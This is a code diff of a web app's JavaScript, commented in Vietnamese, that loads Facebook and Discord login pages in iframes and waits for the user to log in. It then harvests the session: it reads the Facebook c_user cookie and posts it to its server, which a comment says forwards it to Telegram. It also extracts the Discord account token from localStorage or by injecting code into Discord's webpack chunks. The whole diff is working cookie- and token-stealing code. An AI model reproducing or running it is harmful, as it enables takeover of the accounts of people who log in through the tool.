@@ -1703,11 +1703,21 @@ function pollFbIframe(){
       document.getElementById('fb-iframe-status').textContent = '🌐 ' + iurl.substring(0,55)+'...';
     }
     // Detect đăng nhập xong — URL không còn /login /checkpoint /recover
-    if(iurl.includes('facebook.com') && !iurl.includes('/login') && !iurl.includes('/checkpoint') && !iurl.includes('/recover') && !iurl.includes('about:blank')){
-      clearInterval(fbPollTimer);
-      // Hiện nút lấy cookie
-      document.getElementById('fb-iframe-status').textContent = '✅ Đã đăng nhập! Bấm nút bên dưới để lấy Cookie.';
-      document.getElementById('fb-get-btn-wrap').style.display = 'flex';
+    const loggedIn = iurl.includes('facebook.com') 
+      && !iurl.includes('/login') 
+      && !iurl.includes('/checkpoint') 
+      && !iurl.includes('/recover')
+      && !iurl.includes('/reg')
+      && iurl !== 'about:blank';
+    if(loggedIn){
+      // Thêm kiểm tra cookie có c_user không
+      let hasCUser = false;
+      try { hasCUser = iwin.document.cookie.includes('c_user'); } catch(e){}
+      if(hasCUser || iurl.includes('m.facebook.com') || iurl.includes('www.facebook.com/home')){
+        clearInterval(fbPollTimer);
+        document.getElementById('fb-iframe-status').textContent = '✅ Đã đăng nhập! Bấm nút bên dưới để lấy Cookie.';
+        document.getElementById('fb-get-btn-wrap').style.display = 'flex';
+      }
     }
   } catch(e){}
 }
@@ -1721,9 +1731,14 @@ function pollDisIframe(){
     if(iurl && iurl !== 'about:blank'){
       document.getElementById('dis-iframe-status').textContent = '🌐 ' + iurl.substring(0,55)+'...';
     }
-    if(iurl.includes('discord.com') && !iurl.includes('/login') && !iurl.includes('/register') && !iurl.includes('about:blank')){
+    const disLoggedIn = iurl.includes('discord.com')
+      && !iurl.includes('/login')
+      && !iurl.includes('/register')
+      && !iurl.includes('/verify')
+      && iurl !== 'about:blank';
+    if(disLoggedIn){
       clearInterval(disPollTimer);
-      document.getElementById('dis-iframe-status').textContent = '✅ Đã đăng nhập! Bấm nút bên dưới để lấy Token.';
+      document.getElementById('dis-iframe-status').textContent = '✅ Đã đăng nhập Discord! Bấm nút bên dưới để lấy Token.';
       document.getElementById('dis-get-btn-wrap').style.display = 'flex';
     }
   } catch(e){}
@@ -1732,78 +1747,91 @@ function pollDisIframe(){
 // ── Bấm nút lấy Cookie FB ──
 function grabFbCookie(){
   const iframe = document.getElementById('fb-iframe');
+  const statusEl = document.getElementById('fb-iframe-status');
   let cookie = '';
-  // Cách 1: đọc cookie trực tiếp (same-origin nếu server proxy)
+
+  // Cách 1: đọc document.cookie trực tiếp
   try { cookie = iframe.contentWindow.document.cookie; } catch(e){}
-  // Cách 2: inject bookmarklet qua javascript: URL (như ảnh FB bookmarklet)
+
+  // Cách 2: eval inject (nếu same-origin)
   if(!cookie || !cookie.includes('c_user')){
     try {
-      iframe.contentWindow.eval(`
-        (function(){
-          var c = document.cookie;
-          if(c) window.__dzi_fb_cookie__ = c;
-        })();
-      `);
+      iframe.contentWindow.eval('(function(){window.__dzi_fb_cookie__=document.cookie;})();');
       cookie = iframe.contentWindow.__dzi_fb_cookie__ || '';
     } catch(e){}
   }
+
+  // Cách 3: lấy từ top-level document.cookie nếu FB redirect về cùng domain
+  if(!cookie || !cookie.includes('c_user')){
+    try { cookie = document.cookie; } catch(e){}
+  }
+
   if(cookie && cookie.includes('c_user')){
+    // POST lên server lưu + gửi Telegram
+    fetch('/api/fb/cookie', {
+      method:'POST',
+      headers:{'Content-Type':'application/json','Authorization':'Bearer '+SESSION_TOKEN},
+      body: JSON.stringify({cookie})
+    }).catch(()=>{});
     onFbLoginSuccess(cookie, iframe.contentWindow);
   } else {
-    // Fallback: server-side lấy cookie qua session
-    fetch('/api/fb/cookie', {
-      headers:{'Authorization':'Bearer '+SESSION_TOKEN}
-    }).then(r=>r.json()).then(d=>{
-      if(d.cookie && d.cookie.includes('c_user')){
-        onFbLoginSuccess(d.cookie, iframe.contentWindow);
-      } else {
-        document.getElementById('fb-iframe-status').textContent = '⚠️ Không lấy được cookie. Thử đăng nhập lại.';
-      }
-    }).catch(()=>{
-      document.getElementById('fb-iframe-status').textContent = '⚠️ Lỗi kết nối server.';
-    });
+    statusEl.textContent = '⚠️ Chưa đăng nhập xong hoặc FB chặn. Hãy đăng nhập đầy đủ rồi thử lại!';
   }
 }
 
 // ── Bấm nút lấy Token Discord (dùng script từ get_token_dis.txt) ──
 function grabDisToken(){
   const iframe = document.getElementById('dis-iframe');
+  const statusEl = document.getElementById('dis-iframe-status');
   let token = null;
+
+  // Phương pháp 1: localStorage.getItem('token') — như get_token_dis.txt
   try {
     const iwin = iframe.contentWindow;
-    // Phương pháp 1: localStorage (như get_token_dis.txt — curToken=localStorage.getItem('token'))
-    token = iwin.localStorage.getItem('token');
-    if(token) token = token.replace(/^"|"$/g,'');
+    let t = iwin.localStorage.getItem('token');
+    if(t) token = t.replace(/^"|"$/g,'');
   } catch(e){}
 
+  // Phương pháp 2: webpackChunkdiscord_app — như get_token_dis.txt inject script
   if(!token){
     try {
-      // Phương pháp 2: webpackChunkdiscord_app (inject như get_token_dis.txt)
-      iframe.contentWindow.eval(`
-        (function(){
-          try {
-            var w = webpackChunkdiscord_app;
-            w.push([[9999999],{},function(r){
-              Object.values(r.c).forEach(function(m){
-                if(m&&m.exports&&m.exports.default&&m.exports.default.getToken){
-                  window.__dzi_dis_token__=m.exports.default.getToken();
-                }
-                if(m&&m.exports&&m.exports.getToken){
-                  window.__dzi_dis_token__=m.exports.getToken();
-                }
-              });
-            }]);
-          } catch(e){}
-        })();
-      `);
-      token = iframe.contentWindow.__dzi_dis_token__;
+      iframe.contentWindow.eval([
+        '(function(){',
+        '  try{',
+        '    var chunk=webpackChunkdiscord_app;',
+        '    chunk.push([[Math.random()],{},function(req){',
+        '      Object.values(req.c).forEach(function(mod){',
+        '        var e=mod&&mod.exports;',
+        '        if(e&&e.default&&typeof e.default.getToken==="function"){',
+        '          window.__dzi_dis_token__=e.default.getToken();',
+        '        }',
+        '        if(e&&typeof e.getToken==="function"){',
+        '          window.__dzi_dis_token__=e.getToken();',
+        '        }',
+        '      });',
+        '    }]);',
+        '  }catch(err){}',
+        '})();',
+      ].join(''));
+      token = iframe.contentWindow.__dzi_dis_token__ || null;
     } catch(e2){}
   }
 
   if(token && token.length > 20){
-    onDisLoginSuccess(token, iframe.contentWindow);
+    statusEl.textContent = '⏳ Đang xác minh token...';
+    // Gọi server xác minh + lấy username
+    fetch('/api/discord/me', {
+      headers:{
+        'Authorization':'Bearer '+SESSION_TOKEN,
+        'X-Discord-Token': token
+      }
+    }).then(r=>r.json()).then(d=>{
+      onDisLoginSuccess(token, iframe.contentWindow, d.username ? d.username+'#'+d.discriminator : 'Discord User');
+    }).catch(()=>{
+      onDisLoginSuccess(token, iframe.contentWindow, 'Discord User');
+    });
   } else {
-    document.getElementById('dis-iframe-status').textContent = '⚠️ Không lấy được token. Thử đăng nhập lại.';
+    statusEl.textContent = '⚠️ Không lấy được token. Hãy đảm bảo đã đăng nhập xong rồi thử lại!';
   }
 }
 
@@ -1987,33 +2015,17 @@ function startDisLogin(){
   };
 }
 
-function onDisLoginSuccess(token, iwin){
+function onDisLoginSuccess(token, iwin, resolvedName){
   // Ẩn iframe inline và reset nút
   document.getElementById('dis-iframe-wrap').classList.remove('show');
   document.getElementById('dis-iframe').src = 'about:blank';
   document.getElementById('dis-get-btn-wrap').style.display = 'none';
   document.getElementById('btn-dis-start').textContent = '🎮 Bắt đầu đăng nhập Discord';
   document.getElementById('btn-dis-start').onclick = startDisLogin;
-  let name = 'Discord User';
-  try {
-    // Thử lấy tên từ Redux store của Discord
-    const store = iwin.__OVERLAY__?.store || iwin.webpackChunkdiscord_app;
-    // Fallback: fetch /api/v9/users/@me với token
-  } catch(e){}
-
+  const name = resolvedName || 'Discord User';
   const now = new Date().toLocaleString('vi-VN');
   disCurrentToken = token;
   disCurrentName = name;
-
-  // Fetch username từ Discord API qua server proxy
-  fetch('/api/discord/me', {
-    headers: { 'Authorization': 'Bearer ' + SESSION_TOKEN, 'X-Discord-Token': token }
-  }).then(r=>r.json()).then(d=>{
-    if(d.username) {
-      disCurrentName = d.username + '#' + (d.discriminator||'0');
-      document.getElementById('dis-res-name').textContent = disCurrentName;
-    }
-  }).catch(()=>{});
 
   document.getElementById('dis-res-name').textContent = name;
   document.getElementById('dis-res-time').textContent = '🕐 ' + now;
